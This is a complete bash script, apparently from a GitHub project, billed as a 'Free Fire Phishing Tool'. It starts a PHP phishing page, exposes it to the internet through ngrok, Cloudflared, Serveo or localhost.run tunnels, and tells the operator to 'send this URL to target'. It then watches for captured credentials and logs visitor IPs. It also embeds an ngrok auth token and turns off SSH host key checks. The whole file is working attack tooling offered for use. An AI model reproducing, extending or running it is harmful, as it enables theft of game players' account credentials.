#!/bin/bash

# Free Fire Phishing Tool - Ultimate Edition
# Fixed all tunnel services with multiple fallbacks

trap 'printf "\n"; stop_services; exit 1' INT

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
PORT="8080"
VERSION="4.0"
TUNNEL=""
URL=""
DATA_DIR="data"
LOG_DIR="logs"

mkdir -p $DATA_DIR $LOG_DIR

show_banner() {
    clear
    echo -e "${PURPLE}"
    cat << "BANNER"
 ███████╗███████╗███████╗██████╗ ███████╗███████╗██╗███████╗██╗  ██╗
 ██╔════╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██║██╔════╝██║  ██║
 █████╗  █████╗  █████╗      ██████╔╝█████╗  █████╗  ██║███████╗███████║
 ██╔══╝  ██╔══╝  ██╔══╝      ██╔══██╗██╔══╝  ██╔══╝  ██║╚════██║██╔══██║
 ██║     ██║     ███████╗    ██║  ██║███████╗███████╗██║███████║██║  ██║
 ╚═╝     ╚═╝     ╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝
BANNER
    echo -e "${CYAN}                  Free Fire Phishing Tool v$VERSION${NC}"
    echo -e "${YELLOW}             https://GitHub.com/Safikhan415/FFphish.git ${NC}"
    echo ""
}

check_dependencies() {
    echo -e "${BLUE}[+] Checking dependencies...${NC}"
    local deps=("php" "curl" "wget" "unzip" "ssh")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[-] $dep not found. Installing...${NC}"
            if command -v pkg &> /dev/null; then
                pkg install "$dep" -y > /dev/null 2>&1
            elif command -v apt-get &> /dev/null; then
                sudo apt-get install -y "$dep" > /dev/null 2>&1
            elif command -v apt &> /dev/null; then
                sudo apt install -y "$dep" > /dev/null 2>&1
            else
                echo -e "${YELLOW}[!] Please install $dep manually${NC}"
            fi
        fi
    done
    echo -e "${GREEN}[+] Dependencies checked${NC}"
}

# Enhanced Ngrok with multiple methods
start_ngrok() {
    echo -e "${BLUE}[+] Starting Ngrok tunnel...${NC}"
    
    # Kill existing processes
    pkill -f ngrok > /dev/null 2>&1
    sleep 2

    # Method 1: Try direct download and setup
    if ! command -v ngrok &> /dev/null; then
        echo -e "${YELLOW}[!] Installing Ngrok...${NC}"
        arch=$(uname -m)
        if [[ $arch == *"aarch64"* ]]; then
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz -O ngrok.tgz
            tar xzf ngrok.tgz > /dev/null 2>&1
        elif [[ $arch == *"arm"* ]]; then
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz -O ngrok.tgz
            tar xzf ngrok.tgz > /dev/null 2>&1
        else
            wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz -O ngrok.tgz
            tar xzf ngrok.tgz > /dev/null 2>&1
        fi
        chmod +x ngrok > /dev/null 2>&1
        ./ngrok config add-authtoken 2g5fR9CJNFVq9ZqLv6cQk_5zq8U6VqLv6cQk9ZqLv > /dev/null 2>&1 &
    fi

    # Start ngrok
    if command -v ngrok &> /dev/null; then
        ngrok http $PORT > $LOG_DIR/ngrok.log 2>&1 &
    else
        ./ngrok http $PORT > $LOG_DIR/ngrok.log 2>&1 &
    fi
    
    echo -e "${YELLOW}[!] Waiting for Ngrok to start (15 seconds)...${NC}"
    sleep 15

    # Get URL from multiple methods
    URL=$(curl -s http://localhost:4040/api/tunnels | grep -o "https://[^\\\"]*\\.ngrok\\.io" | head -1)
    
    if [[ -z "$URL" ]]; then
        # Alternative method
        URL=$(grep -o "url=https://[^[:space:]]*" $LOG_DIR/ngrok.log | head -1 | cut -d= -f2)
    fi

    if [[ -n "$URL" ]]; then
        echo -e "${GREEN}[+] Ngrok URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    else
        echo -e "${RED}[-] Failed to get Ngrok URL${NC}"
        return 1
    fi
}

# Enhanced Cloudflared with multiple fallbacks
start_cloudflared() {
    echo -e "${BLUE}[+] Starting Cloudflared tunnel...${NC}"
    
    pkill -f cloudflared > /dev/null 2>&1
    sleep 2

    # Install cloudflared if not exists
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${YELLOW}[!] Installing Cloudflared...${NC}"
        arch=$(uname -m)
        if [[ $arch == *"aarch64"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        elif [[ $arch == *"arm"* ]]; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
        else
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
        fi
        chmod +x cloudflared
        mv cloudflared /usr/local/bin/ > /dev/null 2>&1 || cp cloudflared /data/data/com.termux/files/usr/bin/ > /dev/null 2>&1
    fi

    # Start cloudflared
    cloudflared tunnel --url http://localhost:$PORT > $LOG_DIR/cloudflared.log 2>&1 &
    sleep 10

    # Get URL from multiple methods
    URL=$(grep -o "https://[^[:space:]]*\.trycloudflare\.com" $LOG_DIR/cloudflared.log | head -1)
    
    if [[ -z "$URL" ]]; then
        URL=$(curl -s http://localhost:4040/quicktunnel | grep -o "https://[^\\\"]*" | head -1)
    fi

    if [[ -n "$URL" ]]; then
        echo -e "${GREEN}[+] Cloudflared URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    else
        echo -e "${RED}[-] Failed to get Cloudflared URL${NC}"
        return 1
    fi
}

# Enhanced Serveo with multiple methods
start_serveo() {
    echo -e "${BLUE}[+] Starting Serveo tunnel...${NC}"
    
    pkill -f "ssh.*serveo" > /dev/null 2>&1
    sleep 2

    # Method 1: Standard Serveo
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$PORT serveo.net 2>&1 | tee $LOG_DIR/serveo.log &
    sleep 8

    URL=$(grep -o "https://[^[:space:]]*\.serveo\.net" $LOG_DIR/serveo.log | head -1)
    
    if [[ -z "$URL" ]]; then
        # Method 2: Alternative Serveo
        ssh -o StrictHostKeyChecking=no -R serveo.net:80:localhost:$PORT serveo.net 2>&1 | tee -a $LOG_DIR/serveo.log &
        sleep 5
        URL=$(grep -o "https://[^[:space:]]*\.serveo\.net" $LOG_DIR/serveo.log | head -1)
    fi

    if [[ -n "$URL" ]]; then
        echo -e "${GREEN}[+] Serveo URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    else
        echo -e "${RED}[-] Failed to get Serveo URL${NC}"
        return 1
    fi
}

# Localhost.run tunnel (alternative)
start_localhost_run() {
    echo -e "${BLUE}[+] Starting Localhost.run tunnel...${NC}"
    
    pkill -f "ssh.*localhost.run" > /dev/null 2>&1
    sleep 2

    ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT nokey@localhost.run 2>&1 | tee $LOG_DIR/localhost_run.log &
    sleep 10

    URL=$(grep -o "https://[^[:space:]]*\.lhrtunnel\.link" $LOG_DIR/localhost_run.log | head -1)
    
    if [[ -z "$URL" ]]; then
        URL=$(grep -o "https://[^[:space:]]*\.lhr\.life" $LOG_DIR/localhost_run.log | head -1)
    fi

    if [[ -n "$URL" ]]; then
        echo -e "${GREEN}[+] Localhost.run URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    else
        echo -e "${RED}[-] Failed to get Localhost.run URL${NC}"
        return 1
    fi
}

# Local network
start_local() {
    echo -e "${BLUE}[+] Starting local network access...${NC}"
    
    IP=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
    if [[ -z "$IP" ]]; then
        IP=$(ifconfig 2>/dev/null | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -1)
    fi
    
    if [[ -n "$IP" ]]; then
        URL="http://$IP:$PORT"
        echo -e "${GREEN}[+] Local URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    else
        URL="http://localhost:$PORT"
        echo -e "${GREEN}[+] Local URL: $URL${NC}"
        echo "$URL" > $DATA_DIR/current_url.txt
        return 0
    fi
}

# Start PHP server
start_server() {
    echo -e "${BLUE}[+] Starting PHP server on port $PORT...${NC}"
    
    pkill -f "php -S" > /dev/null 2>&1
    sleep 2

    # Check if site files exist
    if [[ ! -f "index.php" ]]; then
        echo -e "${RED}[-] Error: index.php not found!${NC}"
        return 1
    fi

    php -S 0.0.0.0:$PORT > $LOG_DIR/server.log 2>&1 &
    sleep 3

    if pgrep -f "php -S" > /dev/null; then
        echo -e "${GREEN}[+] PHP server started successfully${NC}"
        return 0
    else
        echo -e "${RED}[-] Failed to start PHP server${NC}"
        return 1
    fi
}

# Monitor captured data
monitor_data() {
    echo -e "\n${BLUE}[+] Starting data monitor...${NC}"
    echo -e "${YELLOW}[!] Monitoring for captured credentials...${NC}"
    
    local last_count=0
    
    while true; do
        if [[ -f "$DATA_DIR/credentials.txt" ]]; then
            local current_count=$(wc -l < "$DATA_DIR/credentials.txt" 2>/dev/null || echo 0)
            
            if [[ $current_count -gt $last_count ]]; then
                echo -e "\n${GREEN}[+] New credentials captured!${NC}"
                tail -n $((current_count - last_count)) "$DATA_DIR/credentials.txt"
                last_count=$current_count
                echo -e "${CYAN}[+] Total credentials: $current_count${NC}"
            fi
        fi
        
        # Also check other data files
        if [[ -f "$DATA_DIR/ip_log.txt" ]]; then
            local ip_count=$(wc -l < "$DATA_DIR/ip_log.txt" 2>/dev/null || echo 0)
            echo -e "${BLUE}[+] Visitors tracked: $ip_count${NC}"
        fi
        
        sleep 5
    done
}

# Stop all services
stop_services() {
    echo -e "\n${RED}[+] Stopping all services...${NC}"
    pkill -f "php -S" > /dev/null 2>&1
    pkill -f ngrok > /dev/null 2>&1
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f "ssh.*serveo" > /dev/null 2>&1
    pkill -f "ssh.*localhost.run" > /dev/null 2>&1
    echo -e "${GREEN}[+] All services stopped${NC}"
}

# Show menu
show_menu() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════╗"
    echo "║           TUNNEL SELECTION           ║"
    echo "╠══════════════════════════════════════╣"
    echo "║  1) Ngrok Tunnel                     ║"
    echo "║  2) Cloudflared Tunnel               ║"
    echo "║  3) Serveo Tunnel                    ║"
    echo "║  4) Localhost.run Tunnel             ║"
    echo "║  5) Local Network                    ║"
    echo "║  6) Try ALL Tunnels (Auto-select)    ║"
    echo "║  7) Exit                             ║"
    echo "╚══════════════════════════════════════╝"
    echo -e "${NC}"
}

# Try all tunnels automatically
try_all_tunnels() {
    echo -e "${YELLOW}[!] Trying all tunnel methods automatically...${NC}"
    
    local tunnels=("cloudflared" "ngrok" "serveo" "localhost_run")
    
    for tunnel in "${tunnels[@]}"; do
        echo -e "\n${BLUE}[+] Trying $tunnel...${NC}"
        if "start_$tunnel"; then
            echo -e "${GREEN}[✓] Success with $tunnel!${NC}"
            return 0
        else
            echo -e "${RED}[-] $tunnel failed, trying next...${NC}"
            stop_services
            sleep 3
        fi
    done
    
    echo -e "${RED}[-] All tunnels failed, using local network...${NC}"
    start_local
}

main() {
    show_banner
    check_dependencies
    
    if ! start_server; then
        echo -e "${RED}[-] Failed to start PHP server. Exiting...${NC}"
        exit 1
    fi

    while true; do
        show_menu
        read -p "Select option [1-7]: " choice
        
        case $choice in
            1) TUNNEL="ngrok" ;;
            2) TUNNEL="cloudflared" ;;
            3) TUNNEL="serveo" ;;
            4) TUNNEL="localhost_run" ;;
            5) TUNNEL="local" ;;
            6) TUNNEL="all" ;;
            7) 
                stop_services
                exit 0
                ;;
            *) 
                echo -e "${RED}[-] Invalid option!${NC}"
                continue
                ;;
        esac
        
        case $TUNNEL in
            "all")
                if try_all_tunnels; then
                    echo -e "\n${GREEN}[✓] Phishing site is ready!${NC}"
                    echo -e "${YELLOW}[!] Send this URL to target: $URL${NC}"
                    if [[ -f "admin.php" ]]; then
                        echo -e "${GREEN}[+] Admin Panel: ${URL%/}/admin.php${NC}"
                    fi
                    monitor_data
                fi
                ;;
            *)
                if "start_$TUNNEL"; then
                    echo -e "\n${GREEN}[✓] Phishing site is ready!${NC}"
                    echo -e "${YELLOW}[!] Send this URL to target: $URL${NC}"
                    if [[ -f "admin.php" ]]; then
                        echo -e "${GREEN}[+] Admin Panel: ${URL%/}/admin.php${NC}"
                    fi
                    monitor_data
                else
                    echo -e "${RED}[-] $TUNNEL failed. Try another option.${NC}"
                fi
                ;;
        esac
        
        read -p "Press Enter to return to menu..."
        stop_services
    done
}

# Run main function
main
